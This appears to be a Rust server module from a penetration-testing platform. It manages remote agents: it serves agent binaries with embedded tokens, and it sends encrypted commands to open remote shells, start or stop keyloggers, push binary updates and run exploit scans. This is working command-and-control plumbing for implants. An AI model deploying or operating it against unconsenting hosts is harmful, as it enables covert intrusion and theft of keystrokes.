use super::{
    AgentError, AgentResponse, AgentTokenResponse, AuditAgent, CreateAgentPayload,
    DeploymentToken, KeyloggerRequestPayload, KeyloggerResponse, ScanRequestPayload, ScanResponse,
    ShellRequestPayload, ShellStreamResponse,
};

const CONFIG_MARKER: &[u8] = b"\n###ICARUS_CONFIG###\n";
use crate::{
    api::audits::{self, AuditError},
    middlewares::auth,
    state::GlobalState,
};
use axum::{
    Router,
    middleware::from_fn,
    routing::{delete, get, post},
};
use diesel::{
    ExpressionMethods, OptionalExtension, QueryDsl, RunQueryDsl, SelectableHelper,
    TextExpressionMethods,
};
use sha2::{Digest, Sha256};
use shared::multiplexing::MIN_DATA_STREAM_ID;
use shared::packets::{ExploitScanRequest, KeyloggerRequest, Packet, ShellRequest};

use super::endpoints;

/// Get routes for agents module (nested under /audits)
pub fn get_routes() -> Router<GlobalState> {
    Router::new()
        .route(
            "/{audit_id}/agents",
            post(endpoints::create_agent).get(endpoints::list_agents),
        )
        .route(
            "/{audit_id}/agents/download",
            get(endpoints::download_agent),
        )
        .route(
            "/{audit_id}/agents/{agent_id}",
            delete(endpoints::revoke_agent),
        )
        .route(
            "/{audit_id}/agents/{agent_id}/shell",
            post(endpoints::request_shell),
        )
        .route(
            "/{audit_id}/agents/{agent_id}/shell/history",
            get(endpoints::get_shell_history),
        )
        .route(
            "/{audit_id}/agents/{agent_id}/keylogger",
            post(endpoints::request_keylogger),
        )
        .route(
            "/{audit_id}/agents/{agent_id}/update",
            post(endpoints::request_update),
        )
        .route(
            "/{audit_id}/agents/{agent_id}/scan",
            post(endpoints::request_scan),
        )
        .layer(from_fn(auth::middleware))
}

/// Generate a cryptographically random token
fn generate_token() -> String {
    use rand::Rng;
    let mut rng = rand::rng();
    let bytes: [u8; 32] = rng.random();
    bytes.iter().fold(String::with_capacity(64), |mut acc, b| {
        use std::fmt::Write;
        let _ = write!(acc, "{b:02x}");
        acc
    })
}

/// Hash a token with SHA-256
fn hash_token(token: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(token.as_bytes());
    format!("{:x}", hasher.finalize())
}

/// Create a new agent for an audit
///
/// # Errors
/// Returns `AgentError` if validation fails or database error
pub fn create_agent(
    state: &GlobalState,
    audit_id: &str,
    user_id: &str,
    payload: CreateAgentPayload,
    is_admin: bool,
) -> Result<AgentTokenResponse, AgentError> {
    use crate::schema::audit_agents;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    // Check name uniqueness within audit
    let mut conn = state.get_db_conn()?;
    let existing = audit_agents::table
        .filter(audit_agents::audit_id.eq(audit_id))
        .filter(audit_agents::name.eq(&payload.name))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?;

    if existing.is_some() {
        return Err(AgentError::NameAlreadyExists);
    }

    let raw_token = generate_token();
    let token_hash = hash_token(&raw_token);

    let agent = AuditAgent::new(audit_id.to_string(), payload.name, token_hash);

    diesel::insert_into(audit_agents::table)
        .values(&agent)
        .execute(&mut conn)?;

    Ok(AgentTokenResponse {
        id: agent.id,
        audit_id: agent.audit_id,
        name: agent.name,
        token: raw_token,
    })
}

/// Download agent binary with embedded deployment token for an audit.
/// Does NOT create an agent record — agents self-register on first connection.
///
/// # Errors
/// Returns `AgentError` if binary not found or IO error
pub fn download_agent(
    state: &GlobalState,
    audit_id: &str,
    user_id: &str,
    is_admin: bool,
    server_host: &str,
) -> Result<Vec<u8>, AgentError> {
    use crate::schema::audit_deployment_tokens;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let agent_path = std::env::var("AGENT_BINARY_PATH").unwrap_or_else(|_| "agent.exe".to_string());
    let path = std::path::Path::new(&agent_path);

    if !path.exists() {
        return Err(AgentError::BinaryNotFound);
    }

    // Create a deployment token (not an agent)
    let raw_token = generate_token();
    let token_hash = hash_token(&raw_token);
    let deployment_token =
        DeploymentToken::new(audit_id.to_string(), token_hash, user_id.to_string());

    let mut conn = state.get_db_conn()?;
    diesel::insert_into(audit_deployment_tokens::table)
        .values(&deployment_token)
        .execute(&mut conn)?;

    let server_addr = format!("{server_host}:1337");
    let config_json = serde_json::json!({
        "audit_id": audit_id,
        "token": raw_token,
        "server_addr": server_addr,
    });

    let mut binary =
        std::fs::read(path).map_err(|e| AgentError::BinaryReadError(e.to_string()))?;

    binary.extend_from_slice(CONFIG_MARKER);
    binary.extend_from_slice(config_json.to_string().as_bytes());

    Ok(binary)
}

/// Register a new agent using a deployment token.
/// Called during TCP authentication when the token matches a deployment token.
///
/// # Errors
/// Returns `AgentError` if deployment token invalid or database error
pub fn register_agent_with_deployment_token(
    state: &GlobalState,
    audit_id: &str,
    deployment_token_raw: &str,
    hostname: &str,
) -> Result<(AuditAgent, String), AgentError> {
    use crate::schema::{audit_agents, audit_deployment_tokens};

    let token_hash = hash_token(deployment_token_raw);
    let mut conn = state.get_db_conn()?;

    // Verify deployment token
    let dt = audit_deployment_tokens::table
        .filter(audit_deployment_tokens::audit_id.eq(audit_id))
        .filter(audit_deployment_tokens::token_hash.eq(&token_hash))
        .select(DeploymentToken::as_select())
        .first::<DeploymentToken>(&mut conn)
        .optional()?
        .ok_or(AgentError::InvalidToken)?;

    if dt.is_revoked {
        return Err(AgentError::Revoked);
    }

    // Check audit is valid
    let audit = audits::get_audit(state, audit_id).map_err(|e| match e {
        AuditError::NotFound => AgentError::NotFound,
        other => AgentError::Audit(other),
    })?;

    if audit.is_archived {
        return Err(AgentError::NotFound);
    }

    // Generate unique agent name from hostname
    let base_name = if hostname.is_empty() {
        "agent".to_string()
    } else {
        hostname.to_string()
    };

    // Check if name already exists, append suffix if needed
    let existing_count = audit_agents::table
        .filter(audit_agents::audit_id.eq(audit_id))
        .filter(audit_agents::name.like(format!("{base_name}%")))
        .count()
        .get_result::<i64>(&mut conn)?;

    let agent_name = if existing_count == 0 {
        base_name
    } else {
        format!("{base_name}-{}", existing_count + 1)
    };

    // Create agent with its own unique token
    let raw_agent_token = generate_token();
    let agent_token_hash = hash_token(&raw_agent_token);
    let agent = AuditAgent::new(audit_id.to_string(), agent_name, agent_token_hash);

    diesel::insert_into(audit_agents::table)
        .values(&agent)
        .execute(&mut conn)?;

    // Update last_connected_at
    let now = chrono::Utc::now().naive_utc();
    diesel::update(audit_agents::table.filter(audit_agents::id.eq(&agent.id)))
        .set(audit_agents::last_connected_at.eq(now))
        .execute(&mut conn)?;

    Ok((agent, raw_agent_token))
}

/// List all agents for an audit
///
/// # Errors
/// Returns `AgentError` if database error
pub fn list_agents(
    state: &GlobalState,
    audit_id: &str,
    user_id: &str,
    is_admin: bool,
) -> Result<Vec<AgentResponse>, AgentError> {
    use crate::schema::audit_agents;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let mut conn = state.get_db_conn()?;
    let agents = audit_agents::table
        .filter(audit_agents::audit_id.eq(audit_id))
        .select(AuditAgent::as_select())
        .load::<AuditAgent>(&mut conn)?;

    let registry = state.agent_registry.lock().ok();
    let responses = agents
        .into_iter()
        .map(|agent| {
            let (is_online, latency, last_hb, sys_info) = match &registry {
                Some(reg) => match reg.get(&agent.id) {
                    Some(handle) => {
                        let online = handle.is_online(30);
                        let hb = handle
                            .last_heartbeat
                            .lock()
                            .ok()
                            .and_then(|hb| *hb)
                            .map(|ts| ts.to_rfc3339());
                        let lat = handle
                            .latency_ms
                            .lock()
                            .ok()
                            .and_then(|l| *l);
                        let si = handle
                            .system_info
                            .lock()
                            .ok()
                            .and_then(|si| si.clone())
                            .map(super::SystemInfoResponse::from);
                        (online, lat, hb, si)
                    }
                    None => (false, None, None, None),
                },
                None => (false, None, None, None),
            };
            AgentResponse {
                id: agent.id,
                audit_id: agent.audit_id,
                name: agent.name,
                is_revoked: agent.is_revoked,
                is_online,
                latency_ms: latency,
                last_connected_at: agent.last_connected_at.map(|d| d.to_string()),
                last_heartbeat: last_hb,
                system_info: sys_info,
                server_version: env!("CARGO_PKG_VERSION").to_string(),
                created_at: agent.created_at.to_string(),
            }
        })
        .collect();

    Ok(responses)
}

/// Revoke an agent
///
/// # Errors
/// Returns `AgentError` if agent not found or database error
pub fn revoke_agent(
    state: &GlobalState,
    audit_id: &str,
    agent_id: &str,
    user_id: &str,
    is_admin: bool,
) -> Result<(), AgentError> {
    use crate::schema::audit_agents;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let mut conn = state.get_db_conn()?;
    let agent = audit_agents::table
        .filter(audit_agents::id.eq(agent_id))
        .filter(audit_agents::audit_id.eq(audit_id))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?
        .ok_or(AgentError::NotFound)?;

    if agent.is_revoked {
        return Err(AgentError::Revoked);
    }

    diesel::update(audit_agents::table.filter(audit_agents::id.eq(agent_id)))
        .set(audit_agents::is_revoked.eq(true))
        .execute(&mut conn)?;

    // Disconnect the agent if currently connected
    if let Ok(registry) = state.agent_registry.lock()
        && let Some(handle) = registry.get(agent_id)
    {
        handle.shutdown();
    }

    Ok(())
}

/// Verify an agent token against the database.
/// Returns the agent ID if valid.
///
/// # Errors
/// Returns `AgentError` if token invalid, agent revoked, or database error
pub fn verify_agent_token(
    state: &GlobalState,
    audit_id: &str,
    token: &str,
) -> Result<AuditAgent, AgentError> {
    use crate::schema::audit_agents;

    let token_hash = hash_token(token);
    let mut conn = state.get_db_conn()?;
    let agent = audit_agents::table
        .filter(audit_agents::audit_id.eq(audit_id))
        .filter(audit_agents::token_hash.eq(&token_hash))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?
        .ok_or(AgentError::InvalidToken)?;

    if agent.is_revoked {
        return Err(AgentError::Revoked);
    }

    // Check audit still exists and is not archived
    let audit = audits::get_audit(state, audit_id).map_err(|e| match e {
        AuditError::NotFound => AgentError::NotFound,
        other => AgentError::Audit(other),
    })?;

    if audit.is_archived {
        return Err(AgentError::NotFound);
    }

    // Update last_connected_at
    let now = chrono::Utc::now().naive_utc();
    diesel::update(audit_agents::table.filter(audit_agents::id.eq(&agent.id)))
        .set(audit_agents::last_connected_at.eq(now))
        .execute(&mut conn)?;

    Ok(agent)
}

/// Request a shell session on an agent
///
/// # Errors
/// Returns `AgentError` if agent not found, not online, or send fails
pub async fn request_shell(
    state: &GlobalState,
    audit_id: &str,
    agent_id: &str,
    user_id: &str,
    is_admin: bool,
    payload: ShellRequestPayload,
) -> Result<ShellStreamResponse, AgentError> {
    use crate::schema::audit_agents;
    use tokio::io::AsyncWriteExt;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let mut conn = state.get_db_conn()?;
    let agent = audit_agents::table
        .filter(audit_agents::id.eq(agent_id))
        .filter(audit_agents::audit_id.eq(audit_id))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?
        .ok_or(AgentError::NotFound)?;

    if agent.is_revoked {
        return Err(AgentError::Revoked);
    }

    let (writer, shared_secret) = {
        let registry = state
            .agent_registry
            .lock()
            .map_err(|_| AgentError::ShellRequestFailed("Failed to lock registry".to_string()))?;

        let handle = registry.get(agent_id).ok_or(AgentError::NotFound)?;

        if !handle.is_online(30) {
            return Err(AgentError::AgentNotOnline);
        }

        (handle.writer.clone(), handle.shared_secret)
    };

    let stream_id = MIN_DATA_STREAM_ID + 100;

    let shell_req = ShellRequest::new(payload.shell_type.into());

    let serialized = shell_req.serialize().map_err(|e| {
        AgentError::ShellRequestFailed(format!("Failed to serialize shell request: {e}"))
    })?;

    let (encrypted, nonce) = match shared::encryption::encrypt(&shared_secret, &serialized) {
        Ok(v) => v,
        Err(e) => {
            return Err(AgentError::ShellRequestFailed(format!(
                "Encryption error: {e}"
            )));
        }
    };

    #[allow(clippy::cast_possible_truncation)]
    let len = encrypted.len() as u32;
    let total_size = 4 + nonce.len() + encrypted.len();
    let mut buf = vec![0u8; total_size];

    buf[0..4].copy_from_slice(&len.to_be_bytes());
    buf[4..16].copy_from_slice(&nonce);
    buf[16..].copy_from_slice(&encrypted);

    let mut writer_guard = writer.lock().await;
    if let Err(e) = writer_guard.write_all(&buf).await {
        return Err(AgentError::ShellRequestFailed(format!("Write error: {e}")));
    }
    if let Err(e) = writer_guard.flush().await {
        return Err(AgentError::ShellRequestFailed(format!("Flush error: {e}")));
    }

    Ok(ShellStreamResponse {
        stream_id,
        message: "Shell session requested".to_string(),
    })
}

/// Request to start or stop the keylogger on an agent
///
/// # Errors
/// Returns `AgentError` if agent not found, not online, or send fails
pub async fn request_keylogger(
    state: &GlobalState,
    audit_id: &str,
    agent_id: &str,
    user_id: &str,
    is_admin: bool,
    payload: KeyloggerRequestPayload,
) -> Result<KeyloggerResponse, AgentError> {
    use crate::schema::audit_agents;
    use tokio::io::AsyncWriteExt;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let mut conn = state.get_db_conn()?;
    let agent = audit_agents::table
        .filter(audit_agents::id.eq(agent_id))
        .filter(audit_agents::audit_id.eq(audit_id))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?
        .ok_or(AgentError::NotFound)?;

    if agent.is_revoked {
        return Err(AgentError::Revoked);
    }

    let (writer, shared_secret) = {
        let registry = state
            .agent_registry
            .lock()
            .map_err(|_| {
                AgentError::KeyloggerRequestFailed("Failed to lock registry".to_string())
            })?;

        let handle = registry.get(agent_id).ok_or(AgentError::NotFound)?;

        if !handle.is_online(30) {
            return Err(AgentError::AgentNotOnline);
        }

        (handle.writer.clone(), handle.shared_secret)
    };

    let keylogger_req = match payload.action {
        super::KeyloggerAction::Start => KeyloggerRequest::start(),
        super::KeyloggerAction::Stop => KeyloggerRequest::stop(),
    };

    let serialized = keylogger_req.serialize().map_err(|e| {
        AgentError::KeyloggerRequestFailed(format!("Failed to serialize keylogger request: {e}"))
    })?;

    let (encrypted, nonce) = match shared::encryption::encrypt(&shared_secret, &serialized) {
        Ok(v) => v,
        Err(e) => {
            return Err(AgentError::KeyloggerRequestFailed(format!(
                "Encryption error: {e}"
            )));
        }
    };

    #[allow(clippy::cast_possible_truncation)]
    let len = encrypted.len() as u32;
    let total_size = 4 + nonce.len() + encrypted.len();
    let mut buf = vec![0u8; total_size];

    buf[0..4].copy_from_slice(&len.to_be_bytes());
    buf[4..16].copy_from_slice(&nonce);
    buf[16..].copy_from_slice(&encrypted);

    let mut writer_guard = writer.lock().await;
    if let Err(e) = writer_guard.write_all(&buf).await {
        return Err(AgentError::KeyloggerRequestFailed(format!(
            "Write error: {e}"
        )));
    }
    if let Err(e) = writer_guard.flush().await {
        return Err(AgentError::KeyloggerRequestFailed(format!(
            "Flush error: {e}"
        )));
    }

    let action_str = match payload.action {
        super::KeyloggerAction::Start => "started",
        super::KeyloggerAction::Stop => "stopped",
    };

    Ok(KeyloggerResponse {
        message: format!("Keylogger {action_str}"),
    })
}

async fn send_encrypted_to_agent(
    writer: &tokio::sync::Mutex<tokio::net::tcp::OwnedWriteHalf>,
    secret: &[u8; 32],
    data: &[u8],
) -> Result<(), AgentError> {
    use tokio::io::AsyncWriteExt;

    let (encrypted, nonce) = shared::encryption::encrypt(secret, data)
        .map_err(|e| AgentError::ShellRequestFailed(format!("Encryption error: {e}")))?;

    #[allow(clippy::cast_possible_truncation)]
    let len = encrypted.len() as u32;
    let total_size = 4 + nonce.len() + encrypted.len();
    let mut buf = vec![0u8; total_size];
    buf[0..4].copy_from_slice(&len.to_be_bytes());
    buf[4..16].copy_from_slice(&nonce);
    buf[16..].copy_from_slice(&encrypted);

    let mut w = writer.lock().await;
    w.write_all(&buf)
        .await
        .map_err(|e| AgentError::ShellRequestFailed(format!("Write error: {e}")))?;
    w.flush()
        .await
        .map_err(|e| AgentError::ShellRequestFailed(format!("Flush error: {e}")))?;
    Ok(())
}

#[allow(clippy::too_many_lines)]
pub async fn request_update(
    state: &GlobalState,
    audit_id: &str,
    agent_id: &str,
    user_id: &str,
    is_admin: bool,
) -> Result<serde_json::Value, AgentError> {
    use crate::schema::audit_agents;
    use shared::packets::AgentControl;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let mut conn = state.get_db_conn()?;
    let agent = audit_agents::table
        .filter(audit_agents::id.eq(agent_id))
        .filter(audit_agents::audit_id.eq(audit_id))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?
        .ok_or(AgentError::NotFound)?;

    if agent.is_revoked {
        return Err(AgentError::Revoked);
    }

    let agent_path = std::env::var("AGENT_BINARY_PATH").unwrap_or_else(|_| "agent.exe".to_string());
    let binary =
        std::fs::read(&agent_path).map_err(|e| AgentError::BinaryReadError(e.to_string()))?;

    let version = env!("CARGO_PKG_VERSION").to_string();

    #[allow(clippy::cast_possible_truncation)]
    let binary_size = binary.len() as u64;

    let (writer, shared_secret) = {
        let registry = state
            .agent_registry
            .lock()
            .map_err(|_| AgentError::ShellRequestFailed("Failed to lock registry".to_string()))?;

        let handle = registry.get(agent_id).ok_or(AgentError::NotFound)?;

        if !handle.is_online(30) {
            return Err(AgentError::AgentNotOnline);
        }

        (handle.writer.clone(), handle.shared_secret)
    };

    // 1. Send Update control packet
    let update_cmd = AgentControl::update(version.clone(), binary_size);
    let serialized = update_cmd
        .serialize()
        .map_err(|e| AgentError::ShellRequestFailed(format!("Serialize error: {e}")))?;
    send_encrypted_to_agent(&writer, &shared_secret, &serialized).await?;

    // 2. Stream binary data in chunks
    let chunk_size = 65_536;
    let update_stream_id = 999_u32;
    for chunk in binary.chunks(chunk_size) {
        let data_packet = shared::packets::StreamData {
            stream_id: update_stream_id,
            data: chunk.to_vec(),
        };
        let serialized = data_packet
            .serialize()
            .map_err(|e| AgentError::ShellRequestFailed(format!("Serialize error: {e}")))?;
        send_encrypted_to_agent(&writer, &shared_secret, &serialized).await?;
    }

    tracing::info!(
        "Update binary streamed to agent {} ({} bytes, version {})",
        agent_id,
        binary_size,
        version
    );

    Ok(serde_json::json!({
        "message": format!("Update started (version {version}, {binary_size} bytes)"),
        "version": version,
    }))
}

/// Request the agent to perform a vulnerability scan
///
/// # Errors
/// Returns `AgentError` if agent not found, not online, or send fails
pub async fn request_scan(
    state: &GlobalState,
    audit_id: &str,
    agent_id: &str,
    user_id: &str,
    is_admin: bool,
    payload: ScanRequestPayload,
) -> Result<ScanResponse, AgentError> {
    use crate::schema::audit_agents;

    let audit = audits::get_audit(state, audit_id)?;
    if !audits::can_modify_audit(state, &audit, user_id, is_admin)? {
        return Err(AgentError::MustBeOwnerOrAdmin);
    }

    let mut conn = state.get_db_conn()?;
    let agent = audit_agents::table
        .filter(audit_agents::id.eq(agent_id))
        .filter(audit_agents::audit_id.eq(audit_id))
        .select(AuditAgent::as_select())
        .first::<AuditAgent>(&mut conn)
        .optional()?
        .ok_or(AgentError::NotFound)?;

    if agent.is_revoked {
        return Err(AgentError::Revoked);
    }

    let (writer, shared_secret) = {
        let registry = state
            .agent_registry
            .lock()
            .map_err(|_| AgentError::ScanRequestFailed("Failed to lock registry".to_string()))?;

        let handle = registry.get(agent_id).ok_or(AgentError::NotFound)?;

        if !handle.is_online(30) {
            return Err(AgentError::AgentNotOnline);
        }

        (handle.writer.clone(), handle.shared_secret)
    };

    let scan_req = ExploitScanRequest {
        scan_ports: payload.scan_ports,
        scan_software: payload.scan_software,
        scan_config: payload.scan_config,
    };

    let serialized = scan_req.serialize().map_err(|e| {
        AgentError::ScanRequestFailed(format!("Failed to serialize scan request: {e}"))
    })?;

    send_encrypted_to_agent(&writer, &shared_secret, &serialized)
        .await
        .map_err(|e| {
            AgentError::ScanRequestFailed(format!("Failed to send scan request: {e}"))
        })?;

    Ok(ScanResponse {
        message: "Scan request sent to agent".to_string(),
    })
}
